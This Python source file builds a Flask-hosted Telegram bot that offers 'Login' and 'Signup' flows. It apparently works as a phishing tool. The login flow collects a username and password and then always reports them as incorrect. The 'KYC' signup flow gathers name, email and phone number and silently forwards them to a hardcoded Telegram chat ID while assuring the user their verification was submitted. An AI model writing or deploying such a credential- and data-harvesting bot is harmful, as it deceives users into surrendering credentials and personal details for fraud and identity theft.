from flask import Flask, request
from telegram import Bot, Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Dispatcher, CommandHandler, MessageHandler, Filters, ConversationHandler, CallbackContext
import os

# States
CHOOSING, USERNAME, PASSWORD, NAME, EMAIL, PHONE = range(6)

# Telegram Bot Token
TOKEN = os.environ.get("BOT_TOKEN")
bot = Bot(token=TOKEN)

# Flask app
app = Flask(__name__)

# Dispatcher setup
dispatcher = Dispatcher(bot=bot, update_queue=None, workers=1, use_context=True)

# Start command
def start(update: Update, context: CallbackContext) -> int:
    buttons = [['Login', 'Signup']]
    update.message.reply_text(
        "Welcome! Please choose an option:",
        reply_markup=ReplyKeyboardMarkup(buttons, one_time_keyboard=True, resize_keyboard=True)
    )
    return CHOOSING

# Handle login/signup choice
def choose_option(update: Update, context: CallbackContext) -> int:
    choice = update.message.text
    if choice == 'Login':
        update.message.reply_text("Enter your username:", reply_markup=ReplyKeyboardRemove())
        return USERNAME
    elif choice == 'Signup':
        update.message.reply_text("Let's begin your KYC. What is your full name?", reply_markup=ReplyKeyboardRemove())
        return NAME
    else:
        update.message.reply_text("Invalid option. Please choose Login or Signup.")
        return CHOOSING

# Login flow
def get_username(update: Update, context: CallbackContext) -> int:
    context.user_data['username'] = update.message.text
    update.message.reply_text("Now enter your password:")
    return PASSWORD

def get_password(update: Update, context: CallbackContext) -> int:
    context.user_data['password'] = update.message.text
    update.message.reply_text("Incorrect username or password.")
    return ConversationHandler.END

# Signup (KYC) flow
def get_name(update: Update, context: CallbackContext) -> int:
    context.user_data['name'] = update.message.text
    update.message.reply_text("Thanks! Now, what's your email address?")
    return EMAIL

def get_email(update: Update, context: CallbackContext) -> int:
    context.user_data['email'] = update.message.text
    update.message.reply_text("Great! Lastly, please enter your phone number.")
    return PHONE

def get_phone(update: Update, context: CallbackContext) -> int:
    context.user_data['phone'] = update.message.text
    user_data = context.user_data
    summary = f"KYC Completed:\nName: {user_data['name']}\nEmail: {user_data['email']}\nPhone: {user_data['phone']}"
    update.message.reply_text("Thank you! Your KYC has been submitted.")
    context.bot.send_message(chat_id=1841079821, text=summary)
    return ConversationHandler.END

# Cancel handler
def cancel(update: Update, context: CallbackContext) -> int:
    update.message.reply_text("Operation cancelled.", reply_markup=ReplyKeyboardRemove())
    return ConversationHandler.END

# Conversation handler
conv_handler = ConversationHandler(
    entry_points=[CommandHandler('start', start)],
    states={
        CHOOSING: [MessageHandler(Filters.text & ~Filters.command, choose_option)],
        USERNAME: [MessageHandler(Filters.text & ~Filters.command, get_username)],
        PASSWORD: [MessageHandler(Filters.text & ~Filters.command, get_password)],
        NAME: [MessageHandler(Filters.text & ~Filters.command, get_name)],
        EMAIL: [MessageHandler(Filters.text & ~Filters.command, get_email)],
        PHONE: [MessageHandler(Filters.text & ~Filters.command, get_phone)],
    },
    fallbacks=[CommandHandler('cancel', cancel)],
)

dispatcher.add_handler(conv_handler)

# Webhook route
@app.route("/", methods=["POST"])
def webhook():
    update = Update.de_json(request.get_json(force=True), bot)
    dispatcher.process_update(update)
    return "ok"

# Home route
@app.route("/", methods=["GET"])
def home():
    return "Bot is running!"

# Run the app
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)